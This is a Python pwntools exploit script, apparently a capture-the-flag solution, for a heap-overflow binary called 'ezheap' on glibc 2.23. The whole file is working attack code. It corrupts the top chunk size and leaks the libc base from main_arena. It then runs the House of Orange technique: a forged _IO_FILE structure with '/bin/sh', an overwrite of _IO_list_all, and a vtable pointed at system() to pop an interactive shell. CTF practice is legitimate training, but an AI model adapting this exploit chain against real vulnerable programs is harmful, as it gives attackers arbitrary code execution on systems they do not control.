#coding:utf-8
from pwn import *

context.log_level='debug'
#context.terminal=['tmux','splitw','-h']
elf = ELF('./ezheap')

p = process('./ezheap')
libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
gdb.attach(p)#,'b *$rebase(0x164e)')


# p = remote()
# libc = ELF('./libc.so.6')

def info(name ,address):
   print name + hex(address)

def leak(offset):
   address = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
   info("libc_base[=]=>",address - offset)
   return address - offset

def menu(index):
   p.recvuntil('Your choice : ')
   p.sendline(str(index))

def add(size,content):
   menu(1)
   p.recvuntil('size of it\n')
   p.sendline(str(size))
   p.recvuntil('Name?\n')
   p.sendline(content)

def edit(size,content):
   menu(2)
   p.recvuntil('size of it\n')
   p.sendline(str(size))
   p.recvuntil('name\n')
   p.sendline(content)

def show():
   menu(3)
   p.recvuntil('name is : ')


#------heap addr
heap_base = int(p.recv(len('0x55903c3f0010')),16) - 0x10

content = 'aaa'
add(0x20,content) # +0x30

#--------orange -> libc
payload = 'a'*0x20 + p64(0) + p64(0xfb1)
edit(len(payload),payload)

add(0x2000,'a')

p.recvuntil('Your choice : ')
p.sendline(str(1))
p.recvuntil('size of it\n')
p.sendline(str(16))
p.recvuntil('Name?\n')
p.send('a')


menu(2)
p.recvuntil('size of it\n')
p.sendline('32')
p.recvuntil('name\n')
p.send('a'*32)

show()
p.recvuntil('a'*32)
main_arena = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - 88
print "main_arena=>"+hex(main_arena)
libc_base = main_arena - libc.sym['__malloc_hook']-0x10
print "[+]libc_base=>"+hex(libc_base)

#pause()

#------go back
menu(2)
p.recvuntil('size of it\n')
p.sendline('32')
p.recvuntil('name\n')
payload = 'a'*0x10 + p64(heap_base + 0x50)+p64(0xf71)
p.send(payload)

_IO_list_all_addr = libc_base + libc.sym['_IO_list_all']
system_addr = libc_base + libc.sym['system']
info("system_addr=>",system_addr)
info("_IO_list_all=>",_IO_list_all_addr)

fake_IO_all_list = '/bin/sh\x00'+p64(0x61)
fake_IO_all_list += p64(0)+p64(_IO_list_all_addr-0x10)
fake_IO_all_list += p64(0)+p64(1)
fake_IO_all_list = fake_IO_all_list.ljust(0xc0,'\x00')


payload = 'Gl0w'*(0x10/4)
payload += fake_IO_all_list
payload += p64(0)*3+p64(heap_base + 0x160)
payload += 'Gl0w'*(0x10/4)
payload += p64(heap_base+0x160)
payload += p64(system_addr)*3


edit(len(payload),payload)

pause()

menu(1)
p.recvuntil('size of it\n')
p.sendline(str(0x1000))
p.interactive()